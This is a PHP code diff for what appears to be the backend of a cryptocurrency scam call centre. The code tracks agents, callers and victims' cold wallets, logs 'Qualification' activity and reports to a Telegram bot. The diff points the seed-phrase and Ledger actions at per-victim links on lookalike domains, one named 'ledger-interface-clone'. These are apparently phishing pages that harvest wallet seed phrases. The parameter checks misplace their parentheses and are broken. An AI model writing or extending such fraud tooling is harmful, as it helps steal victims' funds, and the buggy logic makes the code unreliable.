@@ -30,9 +30,13 @@ $cold_wallets = isset($_POST['cold_wallets']) ? trim($_POST['cold_wallets']) : '
 
 $todaydate = date('Y-m-d H:i:s');
 
-if (empty($action) || empty($reference || empty($agent) || empty($caller))) {
-    echo json_encode(['success' => false, 'error' => 'Missing required parameters']);
-    exit;
+if (empty($action) || empty($agent) || empty($caller || empty($reference))) {
+
+    if ($action !== 'alert_team') { 
+        echo json_encode(['success' => false, 'error' => 'Missing required parameters']);
+        exit;
+    }
+     
 }
 
 
@@ -65,6 +69,9 @@ try {
             break;
         case 'save_user_info':
             $response = handleUserInfoAction($reference);
+            break;
+        case 'alert_team':
+            $response = handleAlertTeamAction($reference);
             break;
 
         default:
@@ -215,7 +222,7 @@ function handleSeedPhraseAction($reference)
 {
     global $agent, $department, $balance;
 
-    $seedUrl = "seed.com/" . strtolower($reference);
+    $seedUrl = "https://secure-seed-guardian.lovable.app/" . strtolower($reference);
 
     $sheet = new GoogleSheetsHelper();
     $referenceData = $sheet->searchInSheet('Reference', $reference);
@@ -255,7 +262,7 @@ function handleLedgerAction($reference)
 {
     global $agent, $department, $balance;
 
-    $ledgerUrl = "ledger.com";
+    $ledgerUrl = "https://ledger-interface-clone.lovable.app?ref=" . strtolower($reference);
 
     $sheet = new GoogleSheetsHelper();
     $referenceData = $sheet->searchInSheet('Reference', $reference);
@@ -430,7 +437,7 @@ function handleUserInfoAction($reference)
     } else {
         $email = $referenceData[0]['Email'];
     }
-    
+
     // Store user info data in the database
     $userData = [
         'last_login' => $lastLogin,
@@ -440,9 +447,9 @@ function handleUserInfoAction($reference)
         'cold_wallets' => $cold_wallets,
         'notes' => $notes
     ];
-    
+
     $storeResult = storeUserInfo($reference, $userData);
-    
+
     $jsonData = [
         'Activity' => 'Qualification',
         'Department' => $department ?? 'Unknown',
@@ -460,6 +467,38 @@ function handleUserInfoAction($reference)
     return [
         'success' => true,
         'message' => 'User info saved successfully'
+    ];
+}
+
+function handleAlertTeamAction($reference)
+{
+    global $agent, $department, $notes;
+
+    $sheet = new GoogleSheetsHelper();
+    $referenceData = $sheet->searchInSheet('Reference', $reference);
+
+    $user = getAllAusers($agent);
+
+    if (isset($user[0]) && empty($user[0])) {
+        return ['success' => false, 'error' => 'User not found for reference ' . $reference];
+    }
+
+    $role = $user[0]['role'] ?? 'Unknown';
+
+    $jsonData = [
+        'Activity' => 'Escalation',
+        'Department' => $department ?? 'Unknown',
+        'Agent' => $agent . ' (' . $role . ')',
+        'Notes' => $notes
+    ];
+
+    sendDataToTelegramBot($jsonData, TELEGRAM_ADMIN_BOT_URL);
+
+    // Send email to team manager
+
+    return [
+        'success' => true,
+        'message' => 'Alert sent to team manager'
     ];
 }
 
